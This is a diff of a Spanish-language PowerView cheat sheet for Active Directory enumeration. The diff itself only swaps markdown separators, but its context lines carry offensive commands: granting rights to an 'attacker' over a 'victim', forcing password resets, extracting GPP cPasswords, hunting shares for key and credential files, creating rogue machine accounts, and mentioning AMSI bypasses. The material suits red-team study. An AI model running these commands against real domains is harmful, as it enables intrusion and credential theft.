@@ -25,7 +25,7 @@ linked:
 ---
 # PowerView
 
-***
+---
 
 ## Overview
 
@@ -38,7 +38,7 @@ Carga typical: in-memory via `IEX`, `Invoke-Binary` (dnsCompilable) o `-s` flag 
 
 > Regla: Muchas funciones tienen equivalente en `ActiveDirectory` module (Get-ADUser, etc.). PowerView es preferido cuando no hay RSAT, cuando querés flags no expuestos, o cuando necesitás offensive helpers (`Invoke-*`).
 
-***
+---
 
 ## Carga
 
@@ -66,7 +66,7 @@ AMSI detecta PowerView por firmas. Bypasses:
 - Load fork `PowerView-Dev` obfuscado.
 - AMSI patch en runtime (ver [[evil-winrm]]).
 
-***
+---
 
 ## User / group enum
 
@@ -96,7 +96,7 @@ Get-NetLocalGroup -ComputerName srv01
 Get-NetLocalGroupMember -ComputerName srv01 -GroupName Administrators
 ```
 
-***
+---
 
 ## Computer / OU enum
 
@@ -111,7 +111,7 @@ Get-DomainOU
 Get-DomainOU -Identity 'IT' -Properties gplink      # GPOs linkeados
 ```
 
-***
+---
 
 ## Trusts / forest
 
@@ -127,7 +127,7 @@ Get-NetForestCatalog                                # GCs
 Get-DomainPolicy                                    # default domain policy
 ```
 
-***
+---
 
 ## GPO
 
@@ -140,7 +140,7 @@ Get-DomainGPOComputerLocalGroupMapping -Identity srv01
 Find-InterestingDomainAcl -GPO
 ```
 
-***
+---
 
 ## ACL / permisos
 
@@ -166,7 +166,7 @@ Add-DomainObjectAcl -TargetIdentity victim -PrincipalIdentity attacker -Rights R
 Remove-DomainObjectAcl -TargetIdentity victim -PrincipalIdentity attacker -Rights All
 ```
 
-***
+---
 
 ## Password attacks
 
@@ -194,7 +194,7 @@ Set-DomainUserPassword -Identity victim -AccountPassword (ConvertTo-SecureString
 
 Requiere `User-Force-Change-Password` ACE.
 
-***
+---
 
 ## Session / user location (sin BloodHound)
 
@@ -212,7 +212,7 @@ Invoke-ProcessHunter -UserName Administrator      # procesos del user en hosts
 Invoke-EventHunter -UserName Administrator        # Event logs (requiere admin)
 ```
 
-***
+---
 
 ## Share enum
 
@@ -223,7 +223,7 @@ Find-InterestingDomainShareFile -Include *.kdbx,*.pfx,*.pem,*.config -Recurse
 Find-DomainUserLocation
 ```
 
-***
+---
 
 ## Share ACL / SYSVOL
 
@@ -232,7 +232,7 @@ Get-DomainGPPPassword                             # MS14-025 cPassword
 Get-DomainGPPAutologon
 ```
 
-***
+---
 
 ## DNS records
 
@@ -241,7 +241,7 @@ Get-DomainDNSZone
 Get-DomainDNSRecord -ZoneName domain.local
 ```
 
-***
+---
 
 ## Queries ad-hoc
 
@@ -281,7 +281,7 @@ Get-DomainComputer -LDAPFilter '(!(ms-MCS-AdmPwd=*))'
 Get-DomainObject -LDAPFilter '(whenChanged>=20260101000000.0Z)'
 ```
 
-***
+---
 
 ## Delegation
 
@@ -299,7 +299,7 @@ Get-DomainComputer -Properties 'msds-allowedtoactonbehalfofotheridentity' | ? {$
 
 Explotación ver [[Rubeus]] (s4u).
 
-***
+---
 
 ## Creación de objetos
 
@@ -311,7 +311,7 @@ New-MachineAccount -MachineAccount 'FAKE$' -Password (ConvertTo-SecureString 'Pa
 New-DomainGroup -Identity 'FakeGroup' -Description 'test'
 ```
 
-***
+---
 
 ## Credential checks
 
@@ -331,7 +331,7 @@ Get-DomainUser -Credential $Cred
 Find-DomainShare -Credential $Cred
 ```
 
-***
+---
 
 ## Tips
 
@@ -341,13 +341,13 @@ Find-DomainShare -Credential $Cred
 - Funciones con prefijo `Get-Domain*` (fork moderno) vs `Get-Net*` (clásico). Misma función, nombres duales.
 - Ver `Get-Help <function> -Examples` (si el .ps1 preservó comments).
 
-***
+---
 
 ## Equivalencias con BloodHound
 
 Muchas queries Cypher de [[BloodHound Cypher Queries]] replicables localmente con PowerView — útil cuando no se puede exfiltrar SharpHound output o cuando se necesita data live.
 
-***
+---
 
 ## Referencias
 
